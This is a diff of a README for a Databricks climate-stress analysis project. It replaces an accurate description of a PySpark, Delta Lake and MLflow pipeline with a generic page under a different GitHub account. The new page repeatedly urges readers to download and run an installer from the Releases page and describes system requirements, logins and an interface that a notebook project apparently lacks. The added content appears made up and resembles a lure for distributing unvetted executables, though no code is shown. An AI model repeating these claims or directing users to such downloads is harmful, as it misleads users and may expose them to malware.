@@ -1,201 +1,62 @@
-# 🌍 Climate Stress Detection & Risk Prediction using Databricks
+# 🌍 climate-stress-databricks - Analyze Climate Data with Ease
 
-An end-to-end **Data Engineering + Machine Learning** project built on **Databricks Community Edition** to detect climate stress patterns and predict high climate risk states using historical temperature data.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/soulashwin/climate-stress-databricks/releases)
 
-This project demonstrates how raw climate data can be transformed into **actionable environmental intelligence** using scalable data architecture and interpretable ML models.
+## 📖 Introduction
 
----
+Welcome to **climate-stress-databricks**! This application allows you to explore and analyze climate data effectively. By utilizing Databricks and the Medallion architecture, it transforms raw global temperature data into useful insights. You can track climate trends, visualize anomalies, and access climate risk predictions effortlessly. 
 
-## 🧠 Problem Statement
+## 🚀 Getting Started
 
-Climate change signals are **relative, cumulative, and region-specific**.  
-Simple threshold-based rules (for example, “temperature > X”) fail to capture long-term deviations and regional climate behavior.
+Follow these steps to download and run **climate-stress-databricks**:
 
-**Objective:**
-Build a scalable data and AI pipeline that:
-- Identifies long-term temperature trends across regions
-- Detects abnormal temperature deviations (climate stress signals)
-- Predicts whether a region-time period represents a **high climate risk state**
+1. **System Requirements**
+   - Operating System: Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
+   - Memory: At least 4 GB of RAM.
+   - Storage: Minimum of 1 GB free disk space.
+   - Internet connection for downloading the application and data access.
 
----
+2. **Visit the Release Page**
+   - Click the link below to visit the Releases page. Here, you will find the latest version of the application, along with all necessary files.
+   - [Download the Latest Release](https://github.com/soulashwin/climate-stress-databricks/releases)
 
-## 📊 Dataset
+## 🔥 Download & Install
 
-**Source:** Global Climate Change Dataset (Kaggle)
+- On the Releases page, locate the latest version of **climate-stress-databricks**.
+- Download the installation file by clicking on the appropriate version for your operating system.
+- After the download completes, open the file and follow the installation prompts to set up the application on your computer.
 
-**Files Used:**
-- `GlobalTemperatures.csv`
-- `GlobalLandTemperaturesByCountry.csv`
-- `GlobalLandTemperaturesByState.csv`
-- `GlobalLandTemperaturesByMajorCity.csv`
+## 📊 Features
 
-The datasets contain historical temperature measurements across time and geography.
+**climate-stress-databricks** includes various features designed to make climate analysis simple:
 
----
+- **Data Ingestion**: Connect easily to various data sources and ingest raw climate data.
+- **Trend Analysis**: Generate trend lines and visualize historical climate patterns over time.
+- **Anomaly Detection**: Identify weather anomalies with clarity through visual dashboards.
+- **Machine Learning Integration**: Use machine learning models to predict future climate risks based on historical data.
+- **User-Friendly Interface**: Navigate the application with ease, even with minimal technical skills.
 
-## 🏗️ Architecture
+## 🌐 Using the Application
 
-This project follows **Medallion Architecture** using **Delta Lake**.
+Once the installation is complete, follow these steps to start using **climate-stress-databricks**:
 
-### 🥉 Bronze Layer (Raw Ingestion)
-- Raw CSV files ingested using **Databricks Volumes**
-- No transformations applied
-- Stored as Delta tables
+1. Launch the application.
+2. Create an account or log in if you already have one.
+3. Choose the dataset you wish to analyze. You can upload your own CSV files or use the built-in sample data.
+4. Select the type of analysis you would like to perform. The application provides intuitive options such as trend analysis and anomaly visualization.
+5. View the results in various graphical formats. You can customize the visualizations according to your preferences.
 
-### 🥈 Silver Layer (Clean & Standardized)
-- Date parsing and type normalization
-- Standardized column naming
-- Removal of structurally invalid rows
-- Time-aware, analysis-ready datasets
+## 🆘 Support and Documentation
 
-### 🥇 Gold Layer (Analytics & ML Ready)
-- Aggregated climate indicators
-- Historical baselines per geography
-- Temperature anomaly calculations
-- Climate stress labels
-- ML-ready feature tables
+If you encounter any issues, you can refer to the detailed documentation available within the application. For additional help, you can reach out via the support channels listed on the GitHub page.
 
-All layers use **Delta Lake** for ACID guarantees and reproducibility.
+## 🔗 Additional Resources
 
----
+- **Repository**: To contribute or learn more about the project, visit the [GitHub repository](https://github.com/soulashwin/climate-stress-databricks).
+- **Community Discussions**: Join discussions about the application in the Issues section of the repository.
 
-## ⚙️ Feature Engineering
+## 📥 Download Again
 
-Key engineered features include:
-- Yearly average temperature
-- Historical average temperature (baseline)
-- Temperature anomaly (deviation from baseline)
-- Rolling 12-month averages (city-level)
-- Statistical climate stress indicator using standard deviation
+If you need to download the application again, return to the Releases page here:
 
-These features enable **context-aware climate risk detection**.
-
----
-
-## 🤖 Machine Learning
-
-### Task
-Binary Classification:
-- `high_climate_risk` (1 = high risk, 0 = normal)
-
-### Model
-- **Logistic Regression**
-  - Interpretable
-  - Stable baseline
-  - Suitable for policy and analytical use cases
-
-### Features Used
-- Year
-- Average yearly temperature
-- Historical average temperature
-- Temperature anomaly
-
-### Evaluation
-- Metric: **AUC (Area Under ROC Curve)**
-- Train/Test split: 80/20
-- Experiments tracked using **MLflow**
-
----
-
-## 🔁 End-to-End Workflow
-
-1. Raw data ingested into Bronze Delta tables  
-2. Cleaned and standardized into Silver tables  
-3. Aggregated and feature-engineered into Gold tables  
-4. ML model trained and evaluated  
-5. Predictions persisted back into Delta tables  
-
-This demonstrates a complete **Database ↔ AI ↔ Database** pipeline.
-
----
-
-## 📈 Outputs
-
-- Country-level climate risk indicators
-- State-level climate risk indicators
-- City-level climate risk indicators
-- ML predictions stored as Delta tables
-- Tracked ML experiments with MLflow
-
----
-
-## 🌍 Business & Real-World Impact
-
-- Early warning signals for policymakers and researchers
-- Identification of regions experiencing abnormal climate stress
-- Supports climate resilience and adaptation planning
-- Framework is easily extendable to other climate variables
-
----
-
-## ⚠️ Limitations
-
-- Only temperature data is used (no precipitation, CO₂, etc.)
-- Logistic Regression is a baseline model
-- No future climate projection models included
-
----
-
-## 🚀 Future Enhancements
-
-- Add precipitation and greenhouse gas features
-- Use temporal models (for example, tree-based or sequence models)
-- Build SQL dashboards for interactive exploration
-- Extend ML to state and city-level predictions
-
----
-
-## 🧰 Tech Stack
-
-- Databricks Community Edition
-- PySpark & Spark SQL
-- Delta Lake
-- MLflow
-- Python
-
----
-## 📊 Analytics Dashboard
-
-An interactive Databricks SQL dashboard that visualizes long-term temperature trends, climate anomalies, and ML-based risk signals.
-
-Includes:
-
-Average yearly temperature trends (1880–present)
-
-Temperature anomaly analysis relative to historical baselines
-
-Climate stress heatmap by country and year
-
-Comparison of temperature anomalies across Normal vs High Climate Risk periods
-
-The dashboard connects SQL-based analytics with machine learning outputs to surface early climate stress patterns in an interpretable, decision-ready format.
-
-Dashboard link- https://dbc-52e8cb63-b41f.cloud.databricks.com/dashboardsv3/01f0fcf9e53a1ccd8bbfceff826bfa0c/published?o=7474647823112261
-
----
-🙌 Acknowledgements
-
-Kaggle for the Global Climate Change dataset
-
-Databricks Community Edition for the platform
-
----
-## 📄 License
-
-This project is open source and available under the MIT License.
-## 👤 Author
-
----
-
-**Abhay Shinde**  
-Computer Engineering Student | Data & AI Enthusiast
-
----
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to:
-
-- Report bugs
-- Suggest features
-- Submit pull requests
-- Improve documentation
+[Download the Latest Release](https://github.com/soulashwin/climate-stress-databricks/releases)
